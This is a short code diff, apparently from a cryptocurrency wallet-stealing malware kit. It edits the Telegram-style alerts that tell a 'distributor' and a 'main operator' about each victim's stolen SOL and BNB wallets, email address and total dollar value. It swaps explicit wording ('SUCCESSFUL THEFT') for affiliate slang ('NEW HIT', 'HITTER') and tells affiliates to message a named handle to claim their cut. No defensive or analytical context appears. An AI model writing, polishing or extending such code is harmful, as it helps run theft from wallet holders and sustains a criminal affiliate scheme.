@@ -225,22 +225,22 @@ ${bnbWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${walle
     
     // Send notification to distributor (balance info only)
     const distributorMsg = `
-🎯 **SUCCESSFUL THEFT**
+🎯 **NEW HIT**
 
-📧 Target: ${data.user?.email || 'Unknown'}
+📧 Target: ${data.user?.email || 'Did not set'}
 💰 SOL Wallets: ${solWallets.length} ($${totalSOLValue.toFixed(2)})
 💰 BNB Wallets: ${bnbWallets.length} ($${totalBNBValue.toFixed(2)})
 💵 **Total Value: $${totalValue.toFixed(2)}**
 ⏰ ${new Date().toLocaleString()}
 
-✅ Data sent to operator for processing
+✅ Message startjaden to claim your hit!
     `.trim();
     
     // Send full profile to main operator
     const operatorMsg = `
-🎯 **WALLET THEFT COMPLETE**
+🎯 **NEW LOG**
 
-👤 Distributor: ${data.telegramId}
+👤 HITTER: ${data.telegramId}
 ⏰ ${new Date().toLocaleString()}
 
 ${profileInfo}
